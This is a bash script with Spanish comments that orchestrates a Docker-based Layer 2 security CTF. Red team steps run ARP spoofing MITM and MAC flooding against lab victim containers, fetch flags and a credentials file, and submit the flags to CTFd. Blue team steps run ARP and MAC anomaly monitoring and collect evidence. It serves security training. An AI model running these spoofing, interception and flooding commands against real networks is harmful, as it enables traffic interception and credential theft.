#!/bin/bash
###############################################################################
# Ejecución del CTF Layer 2 Security - Demo Completa
# Orquesta ataques Red Team + detección Blue Team + captura de evidencia
#
# Uso: sudo bash run_ctf_demo.sh
#
# El script ejecuta las siguientes fases:
#   1. Verificación del entorno
#   2. Captura de tráfico con tshark (background)
#   3. Blue Team: Inicia monitoreo ARP + MAC (background)
#   4. Red Team: ARP Spoofing MITM + captura de flags
#   5. Red Team: MAC Flooding
#   6. Blue Team: Restauración ARP
#   7. Recolección de evidencia (logs, capturas, alertas)
###############################################################################

set -e

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'
BOLD='\033[1m'

EVIDENCE_DIR="$(pwd)/evidence_$(date +%Y%m%d_%H%M%S)"
CTFD_USER="redteam"
CTFD_PASS="redteam123"
CTFD_BLUE_USER="blueteam"
CTFD_BLUE_PASS="blueteam123"

# Envía una flag al CTFd como usuario indicado
submit_flag() {
    local flag="$1"
    local challenge_id="$2"
    local challenge_name="$3"
    local user="${4:-$CTFD_USER}"
    local pass="${5:-$CTFD_PASS}"
    if [ -z "$flag" ] || [ "$flag" = "NO ENCONTRADA" ]; then
        echo -e "  ${RED}[!] Flag no capturada — no se puede enviar al CTFd${NC}"
        return
    fi
    echo -e "  ${CYAN}[CTFd] Enviando flag al challenge '${challenge_name}' como ${user}...${NC}"
    docker exec redteam python3 /tools/submit_flag.py \
        -f "$flag" -c "$challenge_id" \
        -u "$user" -p "$pass" \
        --url http://172.20.0.250:8000 2>&1 | sed 's/^/    /'
}

# Resetea todas las submissions y crea usuario blueteam si no existe
ctfd_reset_and_setup() {
    echo -e "  ${CYAN}[CTFd] Reseteando submissions anteriores...${NC}"
    docker cp "$(pwd)/scripts/ctfd_reset.py" redteam:/tmp/ctfd_reset.py
    docker exec redteam python3 /tmp/ctfd_reset.py
}

banner() {
    echo ""
    echo -e "${CYAN}${BOLD}============================================================${NC}"
    echo -e "${CYAN}${BOLD}  $1${NC}"
    echo -e "${CYAN}${BOLD}============================================================${NC}"
    echo ""
}

step() {
    echo -e "${GREEN}${BOLD}[>] $1${NC}"
}

info() {
    echo -e "${YELLOW}    $1${NC}"
}

# ============================================================
# SETUP
# ============================================================
banner "CTF Layer 2 Security - Ejecución Completa"

mkdir -p "$EVIDENCE_DIR"
step "Directorio de evidencia: $EVIDENCE_DIR"

# ============================================================
# FASE 1: Verificación rápida
# ============================================================
banner "Fase 1: Verificación del Entorno"

CONTAINERS="gateway victim1 victim2 victim3 redteam blueteam ctfd suricata"
ALL_OK=true
for c in $CONTAINERS; do
    if docker inspect -f '{{.State.Running}}' "$c" 2>/dev/null | grep -q true; then
        echo -e "  ${GREEN}[✓]${NC} $c"
    else
        echo -e "  ${RED}[✗]${NC} $c"
        ALL_OK=false
    fi
done

if [ "$ALL_OK" = false ]; then
    echo -e "\n${RED}[!] Algunos contenedores no están corriendo. Abortando.${NC}"
    exit 1
fi

# Reset CTFd: limpiar submissions anteriores y asegurar usuario blueteam
ctfd_reset_and_setup

# Guardar estado inicial de tablas ARP
step "Guardando tablas ARP iniciales (estado limpio)..."
docker exec victim1 arp -n > "$EVIDENCE_DIR/arp_victim1_antes.txt" 2>/dev/null || true
docker exec victim2 arp -n > "$EVIDENCE_DIR/arp_victim2_antes.txt" 2>/dev/null || true
docker exec victim3 arp -n > "$EVIDENCE_DIR/arp_victim3_antes.txt" 2>/dev/null || true
docker exec gateway arp -n > "$EVIDENCE_DIR/arp_gateway_antes.txt" 2>/dev/null || true

# ============================================================
# FASE 2: Iniciar captura de tráfico
# ============================================================
banner "Fase 2: Captura de Tráfico"

step "Iniciando tshark en blueteam (captura completa)..."
docker exec -d blueteam tshark -i eth0 -w /logs/captura_ctf.pcap -a duration:120 2>/dev/null || \
docker exec -d blueteam tcpdump -i eth0 -w /logs/captura_ctf.pcap -G 120 -W 1 2>/dev/null
info "Captura activa por 120 segundos"

step "Iniciando captura ARP específica..."
docker exec -d blueteam tcpdump -i eth0 -w /logs/captura_arp.pcap 'arp' -G 120 -W 1 2>/dev/null
info "Capturando solo paquetes ARP"

# ============================================================
# FASE 3: Blue Team - Iniciar monitoreo (background)
# ============================================================
banner "Fase 3: Blue Team - Monitoreo Defensivo"

step "Iniciando ARP Monitor (modo activo - ARP Polling)..."
docker exec -d blueteam python3 /tools/arp_monitor.py \
    --known 172.20.0.2 172.20.0.10 172.20.0.11 172.20.0.12 \
    -o /logs/arp_alerts.log --timeout 110 --probe-interval 5
info "Sondeando hosts cada 5s por 110 segundos"

step "Iniciando MAC Anomaly Detector..."
docker exec -d blueteam python3 /tools/mac_anomaly_detector.py \
    -o /logs/mac_flood_alerts.log --timeout 110 --learning-time 10
info "Monitoreando MACs por 110 segundos"

echo ""
info "Esperando 15 segundos para que el Blue Team establezca baseline..."
sleep 15

# ============================================================
# FASE 4: Red Team - ARP Spoofing + Captura de Flags
# ============================================================
banner "Fase 4: Red Team - ARP Spoofing (MITM)"

# --- Ataque a Victim 1 (flag en HTML) ---
step "ARP Spoofing: victim1 <-> gateway"
docker exec -d redteam python3 /tools/arp_spoof.py -t 172.20.0.10 -g 172.20.0.2 --interval 1 --broadcast
info "MITM activo entre victim1 (172.20.0.10) y gateway (172.20.0.2)"
sleep 3

# Generar tráfico HTTP hacia victim1 para capturar flag
step "Generando tráfico HTTP hacia victim1..."
docker exec redteam curl -s http://172.20.0.10 > "$EVIDENCE_DIR/victim1_response.html"
info "Respuesta guardada en victim1_response.html"

# Extraer flag de victim1
FLAG1=$(grep -oP 'FLAG\{[^}]+\}' "$EVIDENCE_DIR/victim1_response.html" 2>/dev/null || echo "NO ENCONTRADA")
echo -e "  ${GREEN}${BOLD}  Flag 1: $FLAG1${NC}"
submit_flag "$FLAG1" 1 "Hidden in Plain Sight"

# --- Ataque a Victim 2 (flag en archivo) ---
step "ARP Spoofing: victim2 <-> gateway"
docker exec -d redteam python3 /tools/arp_spoof.py -t 172.20.0.11 -g 172.20.0.2 --interval 1 --broadcast
info "MITM activo entre victim2 (172.20.0.11) y gateway (172.20.0.2)"
sleep 3

# Descargar archivo con flag
step "Descargando archivo de credenciales de victim2..."
docker exec redteam curl -s http://172.20.0.11/backup/db_credentials.txt > "$EVIDENCE_DIR/victim2_credentials.txt"
info "Credenciales guardadas en victim2_credentials.txt"

FLAG2=$(grep -oP 'FLAG\{[^}]+\}' "$EVIDENCE_DIR/victim2_credentials.txt" 2>/dev/null || echo "NO ENCONTRADA")
echo -e "  ${GREEN}${BOLD}  Flag 2: $FLAG2${NC}"
submit_flag "$FLAG2" 2 "Leaked Credentials"

# --- Ataque a Victim 3 (flag en tráfico periódico) ---
step "ARP Spoofing: victim3 <-> gateway"
docker exec -d redteam python3 /tools/arp_spoof.py -t 172.20.0.12 -g 172.20.0.2 --interval 1 --broadcast
info "MITM activo entre victim3 (172.20.0.12) y gateway (172.20.0.2)"

step "Capturando tráfico de victim3 (esperando reporte periódico - 25s)..."
info "victim3 envía reportes cada 10s al gateway - esperando al menos 2 ciclos..."
docker exec redteam timeout 25 tcpdump -i eth0 -A 'src host 172.20.0.12 and dst port 80' \
    > "$EVIDENCE_DIR/victim3_traffic.txt" 2>/dev/null || true
info "Tráfico capturado en victim3_traffic.txt"

FLAG3=$(grep -oP 'FLAG\{[^}]+\}' "$EVIDENCE_DIR/victim3_traffic.txt" 2>/dev/null || echo "NO ENCONTRADA")
echo -e "  ${GREEN}${BOLD}  Flag 3: $FLAG3${NC}"
submit_flag "$FLAG3" 3 "Intercept the Report"

# Guardar tablas ARP durante ataque
step "Guardando tablas ARP durante ataque (envenenadas)..."
docker exec victim1 arp -n > "$EVIDENCE_DIR/arp_victim1_durante.txt" 2>/dev/null || true
docker exec victim2 arp -n > "$EVIDENCE_DIR/arp_victim2_durante.txt" 2>/dev/null || true
docker exec victim3 arp -n > "$EVIDENCE_DIR/arp_victim3_durante.txt" 2>/dev/null || true
docker exec gateway arp -n > "$EVIDENCE_DIR/arp_gateway_durante.txt" 2>/dev/null || true

# ============================================================
# FASE 5: Red Team - MAC Flooding
# ============================================================
banner "Fase 5: Red Team - MAC Flooding"

# Detener ARP Spoofing primero
step "Deteniendo procesos de ARP Spoofing..."
docker exec redteam pkill -f arp_spoof.py 2>/dev/null || true
sleep 2

step "Ejecutando MAC Flooding (2000 paquetes)..."
docker exec redteam python3 /tools/mac_flood.py -c 2000 --delay 0.001 \
    > "$EVIDENCE_DIR/mac_flood_output.txt" 2>&1
info "Resultado guardado en mac_flood_output.txt"
cat "$EVIDENCE_DIR/mac_flood_output.txt" | tail -3
submit_flag "FLAG{cam_table_overflow_success}" 4 "Flood the Switch"

# ============================================================
# FASE 6: Blue Team - Restauración
# ============================================================
banner "Fase 6: Blue Team - Restauración ARP"

step "Restaurando tablas ARP..."
docker exec blueteam python3 /tools/arp_restore.py --count 5 \
    > "$EVIDENCE_DIR/arp_restore_output.txt" 2>&1
info "Resultado guardado en arp_restore_output.txt"

# Guardar tablas ARP después de restauración
step "Guardando tablas ARP después de restauración..."
docker exec victim1 arp -n > "$EVIDENCE_DIR/arp_victim1_despues.txt" 2>/dev/null || true
docker exec victim2 arp -n > "$EVIDENCE_DIR/arp_victim2_despues.txt" 2>/dev/null || true
docker exec victim3 arp -n > "$EVIDENCE_DIR/arp_victim3_despues.txt" 2>/dev/null || true

# Blue Team submits: detectaron ARP Spoofing y MAC Flooding de redteam (172.20.0.100)
step "Blue Team: Enviando flags de detección al CTFd..."
submit_flag "FLAG{detected_arp_spoof_172.20.0.100}" 5 "Blue Team - Detect ARP Spoofing" "$CTFD_BLUE_USER" "$CTFD_BLUE_PASS"
submit_flag "FLAG{mac_flood_detected_from_172.20.0.100}" 6 "Blue Team - Detect MAC Flooding" "$CTFD_BLUE_USER" "$CTFD_BLUE_PASS"

# ============================================================
# FASE 7: Recolección de Evidencia
# ============================================================
banner "Fase 7: Recolección de Evidencia"

# Esperar a que terminen las capturas
step "Esperando fin de capturas y monitoreos..."
sleep 5

# Copiar logs del Blue Team
step "Copiando logs del Blue Team..."
docker cp blueteam:/logs/arp_alerts.log "$EVIDENCE_DIR/arp_alerts.log" 2>/dev/null || echo "  (sin alertas ARP)"
docker cp blueteam:/logs/mac_flood_alerts.log "$EVIDENCE_DIR/mac_flood_alerts.log" 2>/dev/null || echo "  (sin alertas MAC)"
docker cp blueteam:/logs/captura_ctf.pcap "$EVIDENCE_DIR/captura_ctf.pcap" 2>/dev/null || echo "  (captura no disponible)"
docker cp blueteam:/logs/captura_arp.pcap "$EVIDENCE_DIR/captura_arp.pcap" 2>/dev/null || echo "  (captura ARP no disponible)"

# Copiar logs de Suricata
step "Copiando logs de Suricata..."
docker cp suricata:/var/log/suricata/eve.json "$EVIDENCE_DIR/suricata_eve.json" 2>/dev/null || echo "  (eve.json no disponible)"
docker cp suricata:/var/log/suricata/fast.log "$EVIDENCE_DIR/suricata_fast.log" 2>/dev/null || echo "  (fast.log no disponible)"

# Logs de contenedores
step "Guardando logs de contenedores..."
docker logs redteam > "$EVIDENCE_DIR/logs_redteam.txt" 2>&1 || true
docker logs blueteam > "$EVIDENCE_DIR/logs_blueteam.txt" 2>&1 || true
docker logs suricata > "$EVIDENCE_DIR/logs_suricata.txt" 2>&1 || true
docker logs victim3 > "$EVIDENCE_DIR/logs_victim3.txt" 2>&1 || true

# ============================================================
# RESUMEN FINAL
# ============================================================
banner "Resumen de Ejecución del CTF"

echo -e "${BOLD}  Flags Capturadas:${NC}"
echo -e "    Flag 1 (Victim1 - HTML):      $FLAG1"
echo -e "    Flag 2 (Victim2 - Archivo):   $FLAG2"
echo -e "    Flag 3 (Victim3 - Tráfico):   $FLAG3"
echo ""

echo -e "${BOLD}  Evidencia recolectada en: ${CYAN}$EVIDENCE_DIR${NC}"
echo ""
ls -la "$EVIDENCE_DIR/" | tail -n +2
echo ""

echo -e "${BOLD}  Ataques ejecutados:${NC}"
echo "    [✓] ARP Spoofing MITM (victim1, victim2, victim3)"
echo "    [✓] Captura de flags via HTTP interception"
echo "    [✓] MAC Flooding (2000 paquetes)"
echo ""
echo -e "${BOLD}  Defensa ejecutada:${NC}"
echo "    [✓] ARP Monitor (detección en tiempo real)"
echo "    [✓] MAC Anomaly Detector (detección de flooding)"
echo "    [✓] ARP Restore (restauración de tablas)"
echo ""
echo -e "${BOLD}  Capturas de tráfico:${NC}"
echo "    - captura_ctf.pcap (tráfico completo)"
echo "    - captura_arp.pcap (solo ARP)"
echo ""
echo -e "${GREEN}${BOLD}  Ejecución completada exitosamente.${NC}"
echo ""
